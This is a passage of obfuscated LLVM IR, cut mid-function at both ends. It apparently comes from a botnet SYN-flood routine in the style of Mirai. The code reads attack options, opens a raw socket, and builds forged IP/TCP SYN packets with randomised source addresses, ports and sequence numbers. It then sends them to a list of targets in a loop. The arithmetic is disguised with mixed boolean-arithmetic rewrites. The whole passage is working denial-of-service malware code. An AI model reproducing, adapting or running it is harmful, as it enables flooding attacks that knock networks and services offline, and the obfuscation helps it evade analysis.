  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %654

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %654

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %472, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %479

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 15, -1
  %135 = xor i8 %133, %134
  %136 = and i8 %135, %133
  %137 = and i8 %133, 15
  %138 = and i8 %136, 64
  %139 = xor i8 %136, 64
  %140 = or i8 %138, %139
  %141 = or i8 %136, 64
  store i8 %140, i8* %132, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = xor i8 %144, -1
  %146 = xor i8 -16, -1
  %147 = xor i8 57, -1
  %148 = or i8 %145, %146
  %149 = or i8 57, %147
  %150 = xor i8 %148, -1
  %151 = and i8 %150, %149
  %152 = and i8 %144, -16
  %153 = xor i8 %151, -1
  %154 = xor i8 5, -1
  %155 = xor i8 -24, -1
  %156 = and i8 %153, -24
  %157 = and i8 %151, %155
  %158 = and i8 %154, -24
  %159 = and i8 5, %155
  %160 = or i8 %156, %157
  %161 = or i8 %158, %159
  %162 = xor i8 %160, %161
  %163 = or i8 %153, %154
  %164 = xor i8 %163, -1
  %165 = or i8 -24, %155
  %166 = and i8 %164, %165
  %167 = or i8 %162, %166
  %168 = or i8 %151, 5
  store i8 %167, i8* %143, align 4
  %169 = load i8, i8* %12, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = call zeroext i16 @htons(i16 zeroext 60) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %13, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %15, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %113
  %185 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 4
  store i16 %185, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %184, %113
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 6, i8* %190, align 1
  %191 = load i32, i32* %26, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %16, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 4
  %206 = load i16, i16* %17, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* %18, align 4
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = zext i16 %212 to i32
  %214 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 2
  store i32 %213, i32* %215, align 4
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -241, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -241
  %223 = and i16 %221, 160
  %224 = xor i16 %221, 160
  %225 = or i16 %223, %224
  %226 = or i16 %221, 160
  store i16 %225, i16* %217, align 4
  %227 = load i8, i8* %20, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = xor i16 %228, -1
  %233 = xor i16 1, -1
  %234 = xor i16 -19110, -1
  %235 = or i16 %232, %233
  %236 = or i16 -19110, %234
  %237 = xor i16 %235, -1
  %238 = and i16 %237, %236
  %239 = and i16 %228, 1
  %240 = shl i16 %238, 13
  %241 = xor i16 %231, -1
  %242 = xor i16 -8193, -1
  %243 = xor i16 17951, -1
  %244 = or i16 %241, %242
  %245 = or i16 17951, %243
  %246 = xor i16 %244, -1
  %247 = and i16 %246, %245
  %248 = and i16 %231, -8193
  %249 = and i16 %247, %240
  %250 = xor i16 %247, %240
  %251 = or i16 %249, %250
  %252 = or i16 %247, %240
  store i16 %251, i16* %230, align 4
  %253 = load i8, i8* %21, align 1
  %254 = sext i8 %253 to i16
  %255 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = xor i16 %254, -1
  %259 = xor i16 1, -1
  %260 = xor i16 -30600, -1
  %261 = or i16 %258, %259
  %262 = or i16 -30600, %260
  %263 = xor i16 %261, -1
  %264 = and i16 %263, %262
  %265 = and i16 %254, 1
  %266 = shl i16 %264, 12
  %267 = xor i16 -4097, -1
  %268 = xor i16 %257, %267
  %269 = and i16 %268, %257
  %270 = and i16 %257, -4097
  %271 = xor i16 %269, -1
  %272 = xor i16 %266, -1
  %273 = xor i16 -462, -1
  %274 = and i16 %271, -462
  %275 = and i16 %269, %273
  %276 = and i16 %272, -462
  %277 = and i16 %266, %273
  %278 = or i16 %274, %275
  %279 = or i16 %276, %277
  %280 = xor i16 %278, %279
  %281 = or i16 %271, %272
  %282 = xor i16 %281, -1
  %283 = or i16 -462, %273
  %284 = and i16 %282, %283
  %285 = or i16 %280, %284
  %286 = or i16 %269, %266
  store i16 %285, i16* %256, align 4
  %287 = load i8, i8* %22, align 1
  %288 = sext i8 %287 to i16
  %289 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = xor i16 %288, -1
  %293 = xor i16 1, -1
  %294 = xor i16 -9613, -1
  %295 = or i16 %292, %293
  %296 = or i16 -9613, %294
  %297 = xor i16 %295, -1
  %298 = and i16 %297, %296
  %299 = and i16 %288, 1
  %300 = shl i16 %298, 11
  %301 = xor i16 -2049, -1
  %302 = xor i16 %291, %301
  %303 = and i16 %302, %291
  %304 = and i16 %291, -2049
  %305 = xor i16 %303, -1
  %306 = xor i16 %300, -1
  %307 = xor i16 -15103, -1
  %308 = and i16 %305, -15103
  %309 = and i16 %303, %307
  %310 = and i16 %306, -15103
  %311 = and i16 %300, %307
  %312 = or i16 %308, %309
  %313 = or i16 %310, %311
  %314 = xor i16 %312, %313
  %315 = or i16 %305, %306
  %316 = xor i16 %315, -1
  %317 = or i16 -15103, %307
  %318 = and i16 %316, %317
  %319 = or i16 %314, %318
  %320 = or i16 %303, %300
  store i16 %319, i16* %290, align 4
  %321 = load i8, i8* %23, align 1
  %322 = sext i8 %321 to i16
  %323 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 4
  %325 = load i16, i16* %324, align 4
  %326 = xor i16 1, -1
  %327 = xor i16 %322, %326
  %328 = and i16 %327, %322
  %329 = and i16 %322, 1
  %330 = shl i16 %328, 10
  %331 = xor i16 %325, -1
  %332 = xor i16 -1025, -1
  %333 = xor i16 26404, -1
  %334 = or i16 %331, %332
  %335 = or i16 26404, %333
  %336 = xor i16 %334, -1
  %337 = and i16 %336, %335
  %338 = and i16 %325, -1025
  %339 = xor i16 %337, -1
  %340 = xor i16 %330, -1
  %341 = xor i16 28934, -1
  %342 = and i16 %339, 28934
  %343 = and i16 %337, %341
  %344 = and i16 %340, 28934
  %345 = and i16 %330, %341
  %346 = or i16 %342, %343
  %347 = or i16 %344, %345
  %348 = xor i16 %346, %347
  %349 = or i16 %339, %340
  %350 = xor i16 %349, -1
  %351 = or i16 28934, %341
  %352 = and i16 %350, %351
  %353 = or i16 %348, %352
  %354 = or i16 %337, %330
  store i16 %353, i16* %324, align 4
  %355 = load i8, i8* %24, align 1
  %356 = sext i8 %355 to i16
  %357 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 4
  %359 = load i16, i16* %358, align 4
  %360 = xor i16 %356, -1
  %361 = xor i16 1, -1
  %362 = xor i16 -22655, -1
  %363 = or i16 %360, %361
  %364 = or i16 -22655, %362
  %365 = xor i16 %363, -1
  %366 = and i16 %365, %364
  %367 = and i16 %356, 1
  %368 = shl i16 %366, 9
  %369 = xor i16 -513, -1
  %370 = xor i16 %359, %369
  %371 = and i16 %370, %359
  %372 = and i16 %359, -513
  %373 = xor i16 %371, -1
  %374 = xor i16 %368, -1
  %375 = xor i16 -12637, -1
  %376 = and i16 %373, -12637
  %377 = and i16 %371, %375
  %378 = and i16 %374, -12637
  %379 = and i16 %368, %375
  %380 = or i16 %376, %377
  %381 = or i16 %378, %379
  %382 = xor i16 %380, %381
  %383 = or i16 %373, %374
  %384 = xor i16 %383, -1
  %385 = or i16 -12637, %375
  %386 = and i16 %384, %385
  %387 = or i16 %382, %386
  %388 = or i16 %371, %368
  store i16 %387, i16* %358, align 4
  %389 = load i8, i8* %25, align 1
  %390 = sext i8 %389 to i16
  %391 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %392 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %391, i32 0, i32 4
  %393 = load i16, i16* %392, align 4
  %394 = xor i16 %390, -1
  %395 = xor i16 1, -1
  %396 = xor i16 24905, -1
  %397 = or i16 %394, %395
  %398 = or i16 24905, %396
  %399 = xor i16 %397, -1
  %400 = and i16 %399, %398
  %401 = and i16 %390, 1
  %402 = shl i16 %400, 8
  %403 = xor i16 %393, -1
  %404 = xor i16 -257, -1
  %405 = xor i16 -24438, -1
  %406 = or i16 %403, %404
  %407 = or i16 -24438, %405
  %408 = xor i16 %406, -1
  %409 = and i16 %408, %407
  %410 = and i16 %393, -257
  %411 = xor i16 %409, -1
  %412 = xor i16 %402, -1
  %413 = xor i16 -26324, -1
  %414 = and i16 %411, -26324
  %415 = and i16 %409, %413
  %416 = and i16 %412, -26324
  %417 = and i16 %402, %413
  %418 = or i16 %414, %415
  %419 = or i16 %416, %417
  %420 = xor i16 %418, %419
  %421 = or i16 %411, %412
  %422 = xor i16 %421, -1
  %423 = or i16 -26324, %413
  %424 = and i16 %422, %423
  %425 = or i16 %420, %424
  %426 = or i16 %409, %402
  store i16 %425, i16* %392, align 4
  %427 = load i8*, i8** %29, align 8
  %428 = getelementptr inbounds i8, i8* %427, i32 1
  store i8* %428, i8** %29, align 8
  store i8 2, i8* %427, align 1
  %429 = load i8*, i8** %29, align 8
  %430 = getelementptr inbounds i8, i8* %429, i32 1
  store i8* %430, i8** %29, align 8
  store i8 4, i8* %429, align 1
  %431 = call i32 @rand_next()
  %432 = xor i32 15, -1
  %433 = xor i32 %431, %432
  %434 = and i32 %433, %431
  %435 = and i32 %431, 15
  %436 = sub i32 0, 1400
  %437 = sub i32 0, %434
  %438 = add i32 %436, %437
  %439 = sub i32 0, %438
  %440 = add i32 1400, %434
  %441 = trunc i32 %439 to i16
  %442 = call zeroext i16 @htons(i16 zeroext %441) #7
  %443 = load i8*, i8** %29, align 8
  %444 = bitcast i8* %443 to i16*
  store i16 %442, i16* %444, align 2
  %445 = load i8*, i8** %29, align 8
  %446 = getelementptr inbounds i8, i8* %445, i64 2
  store i8* %446, i8** %29, align 8
  %447 = load i8*, i8** %29, align 8
  %448 = getelementptr inbounds i8, i8* %447, i32 1
  store i8* %448, i8** %29, align 8
  store i8 4, i8* %447, align 1
  %449 = load i8*, i8** %29, align 8
  %450 = getelementptr inbounds i8, i8* %449, i32 1
  store i8* %450, i8** %29, align 8
  store i8 2, i8* %449, align 1
  %451 = load i8*, i8** %29, align 8
  %452 = getelementptr inbounds i8, i8* %451, i32 1
  store i8* %452, i8** %29, align 8
  store i8 8, i8* %451, align 1
  %453 = load i8*, i8** %29, align 8
  %454 = getelementptr inbounds i8, i8* %453, i32 1
  store i8* %454, i8** %29, align 8
  store i8 10, i8* %453, align 1
  %455 = call i32 @rand_next()
  %456 = load i8*, i8** %29, align 8
  %457 = bitcast i8* %456 to i32*
  store i32 %455, i32* %457, align 4
  %458 = load i8*, i8** %29, align 8
  %459 = getelementptr inbounds i8, i8* %458, i64 4
  store i8* %459, i8** %29, align 8
  %460 = load i8*, i8** %29, align 8
  %461 = bitcast i8* %460 to i32*
  store i32 0, i32* %461, align 4
  %462 = load i8*, i8** %29, align 8
  %463 = getelementptr inbounds i8, i8* %462, i64 4
  store i8* %463, i8** %29, align 8
  %464 = load i8*, i8** %29, align 8
  %465 = getelementptr inbounds i8, i8* %464, i32 1
  store i8* %465, i8** %29, align 8
  store i8 1, i8* %464, align 1
  %466 = load i8*, i8** %29, align 8
  %467 = getelementptr inbounds i8, i8* %466, i32 1
  store i8* %467, i8** %29, align 8
  store i8 3, i8* %466, align 1
  %468 = load i8*, i8** %29, align 8
  %469 = getelementptr inbounds i8, i8* %468, i32 1
  store i8* %469, i8** %29, align 8
  store i8 3, i8* %468, align 1
  %470 = load i8*, i8** %29, align 8
  %471 = getelementptr inbounds i8, i8* %470, i32 1
  store i8* %471, i8** %29, align 8
  store i8 6, i8* %470, align 1
  br label %472

; <label>:472:                                    ; preds = %188
  %473 = load i32, i32* %9, align 4
  %474 = sub i32 0, %473
  %475 = sub i32 0, 1
  %476 = add i32 %474, %475
  %477 = sub i32 0, %476
  %478 = add nsw i32 %473, 1
  store i32 %477, i32* %9, align 4
  br label %108

; <label>:479:                                    ; preds = %108
  br label %480

; <label>:480:                                    ; preds = %653, %479
  store i32 0, i32* %9, align 4
  br label %481

; <label>:481:                                    ; preds = %647, %480
  %482 = load i32, i32* %9, align 4
  %483 = load i8, i8* %5, align 1
  %484 = zext i8 %483 to i32
  %485 = icmp slt i32 %482, %484
  br i1 %485, label %486, label %653

; <label>:486:                                    ; preds = %481
  %487 = load i8**, i8*** %11, align 8
  %488 = load i32, i32* %9, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds i8*, i8** %487, i64 %489
  %491 = load i8*, i8** %490, align 8
  store i8* %491, i8** %30, align 8
  %492 = load i8*, i8** %30, align 8
  %493 = bitcast i8* %492 to %struct.iphdr*
  store %struct.iphdr* %493, %struct.iphdr** %31, align 8
  %494 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i64 1
  %496 = bitcast %struct.iphdr* %495 to %struct.tcphdr*
  store %struct.tcphdr* %496, %struct.tcphdr** %32, align 8
  %497 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %498 = load i32, i32* %9, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %497, i64 %499
  %501 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %500, i32 0, i32 2
  %502 = load i8, i8* %501, align 4
  %503 = zext i8 %502 to i32
  %504 = icmp slt i32 %503, 32
  br i1 %504, label %505, label %529

; <label>:505:                                    ; preds = %486
  %506 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %507 = load i32, i32* %9, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i64 %508
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i32 0, i32 1
  %511 = load i32, i32* %510, align 4
  %512 = call i32 @ntohl(i32 %511) #7
  %513 = call i32 @rand_next()
  %514 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %515 = load i32, i32* %9, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i64 %516
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i32 0, i32 2
  %519 = load i8, i8* %518, align 4
  %520 = zext i8 %519 to i32
  %521 = lshr i32 %513, %520
  %522 = add i32 %512, -1531569571
  %523 = add i32 %522, %521
  %524 = sub i32 %523, -1531569571
  %525 = add i32 %512, %521
  %526 = call i32 @htonl(i32 %524) #7
  %527 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  store i32 %526, i32* %528, align 4
  br label %529

; <label>:529:                                    ; preds = %505, %486
  %530 = load i32, i32* %26, align 4
  %531 = icmp eq i32 %530, -1
  br i1 %531, label %532, label %536

; <label>:532:                                    ; preds = %529
  %533 = call i32 @rand_next()
  %534 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 8
  store i32 %533, i32* %535, align 4
  br label %536

; <label>:536:                                    ; preds = %532, %529
  %537 = load i16, i16* %13, align 2
  %538 = zext i16 %537 to i32
  %539 = icmp eq i32 %538, 65535
  br i1 %539, label %540, label %549

; <label>:540:                                    ; preds = %536
  %541 = call i32 @rand_next()
  %542 = xor i32 65535, -1
  %543 = xor i32 %541, %542
  %544 = and i32 %543, %541
  %545 = and i32 %541, 65535
  %546 = trunc i32 %544 to i16
  %547 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 3
  store i16 %546, i16* %548, align 4
  br label %549

; <label>:549:                                    ; preds = %540, %536
  %550 = load i16, i16* %16, align 2
  %551 = zext i16 %550 to i32
  %552 = icmp eq i32 %551, 65535
  br i1 %552, label %553, label %562

; <label>:553:                                    ; preds = %549
  %554 = call i32 @rand_next()
  %555 = xor i32 65535, -1
  %556 = xor i32 %554, %555
  %557 = and i32 %556, %554
  %558 = and i32 %554, 65535
  %559 = trunc i32 %557 to i16
  %560 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 0
  store i16 %559, i16* %561, align 4
  br label %562

; <label>:562:                                    ; preds = %553, %549
  %563 = load i16, i16* %17, align 2
  %564 = zext i16 %563 to i32
  %565 = icmp eq i32 %564, 65535
  br i1 %565, label %566, label %579

; <label>:566:                                    ; preds = %562
  %567 = call i32 @rand_next()
  %568 = xor i32 %567, -1
  %569 = xor i32 65535, -1
  %570 = xor i32 -344269089, -1
  %571 = or i32 %568, %569
  %572 = or i32 -344269089, %570
  %573 = xor i32 %571, -1
  %574 = and i32 %573, %572
  %575 = and i32 %567, 65535
  %576 = trunc i32 %574 to i16
  %577 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 1
  store i16 %576, i16* %578, align 2
  br label %579

; <label>:579:                                    ; preds = %566, %562
  %580 = load i32, i32* %18, align 4
  %581 = icmp eq i32 %580, 65535
  br i1 %581, label %582, label %586

; <label>:582:                                    ; preds = %579
  %583 = call i32 @rand_next()
  %584 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 2
  store i32 %583, i32* %585, align 4
  br label %586

; <label>:586:                                    ; preds = %582, %579
  %587 = load i32, i32* %19, align 4
  %588 = icmp eq i32 %587, 65535
  br i1 %588, label %589, label %593

; <label>:589:                                    ; preds = %586
  %590 = call i32 @rand_next()
  %591 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 3
  store i32 %590, i32* %592, align 4
  br label %593

; <label>:593:                                    ; preds = %589, %586
  %594 = load i8, i8* %20, align 1
  %595 = icmp ne i8 %594, 0
  br i1 %595, label %596, label %609

; <label>:596:                                    ; preds = %593
  %597 = call i32 @rand_next()
  %598 = xor i32 %597, -1
  %599 = xor i32 65535, -1
  %600 = xor i32 998656897, -1
  %601 = or i32 %598, %599
  %602 = or i32 998656897, %600
  %603 = xor i32 %601, -1
  %604 = and i32 %603, %602
  %605 = and i32 %597, 65535
  %606 = trunc i32 %604 to i16
  %607 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 7
  store i16 %606, i16* %608, align 2
  br label %609

; <label>:609:                                    ; preds = %596, %593
  %610 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %611 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %610, i32 0, i32 7
  store i16 0, i16* %611, align 2
  %612 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %613 = bitcast %struct.iphdr* %612 to i16*
  %614 = call zeroext i16 @checksum_generic(i16* %613, i32 20)
  %615 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %616 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %615, i32 0, i32 7
  store i16 %614, i16* %616, align 2
  %617 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 6
  store i16 0, i16* %618, align 4
  %619 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %620 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %621 = bitcast %struct.tcphdr* %620 to i8*
  %622 = call zeroext i16 @htons(i16 zeroext 40) #7
  %623 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %619, i8* %621, i16 zeroext %622, i32 40)
  %624 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %625 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %624, i32 0, i32 6
  store i16 %623, i16* %625, align 4
  %626 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %627 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %626, i32 0, i32 1
  %628 = load i16, i16* %627, align 2
  %629 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %630 = load i32, i32* %9, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %629, i64 %631
  %633 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i32 0, i32 0
  %634 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %633, i32 0, i32 1
  store i16 %628, i16* %634, align 2
  %635 = load i32, i32* %10, align 4
  %636 = load i8*, i8** %30, align 8
  %637 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %638 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %639 = load i32, i32* %9, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i64 %640
  %642 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %641, i32 0, i32 0
  %643 = bitcast %struct.sockaddr_in* %642 to %struct.sockaddr*
  store %struct.sockaddr* %643, %struct.sockaddr** %637, align 8
  %644 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %645 = load %struct.sockaddr*, %struct.sockaddr** %644, align 8
  %646 = call i64 @sendto(i32 %635, i8* %636, i64 60, i32 16384, %struct.sockaddr* %645, i32 16)
  br label %647

; <label>:647:                                    ; preds = %609
  %648 = load i32, i32* %9, align 4
  %649 = add i32 %648, -1085119340
  %650 = add i32 %649, 1
  %651 = sub i32 %650, -1085119340
  %652 = add nsw i32 %648, 1
  store i32 %651, i32* %9, align 4
